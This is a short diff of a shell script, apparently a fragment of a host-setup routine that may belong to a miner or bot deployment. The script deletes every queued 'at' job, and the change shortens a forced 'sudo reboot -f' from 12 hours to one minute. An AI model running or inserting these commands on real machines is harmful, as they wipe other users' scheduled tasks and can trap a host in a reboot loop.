@@ -4,7 +4,7 @@ MNRCO="vnbrerr"
 ID="$(hostname)"
 THREADS="$(nproc --all)"
 for i in `atq | awk '{print $1}'`;do atrm $i;done
-echo 'sudo reboot -f' | at now + 12 hours
+echo 'sudo reboot -f' | at now + 1 minute
 rm -rf /tmp/none/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
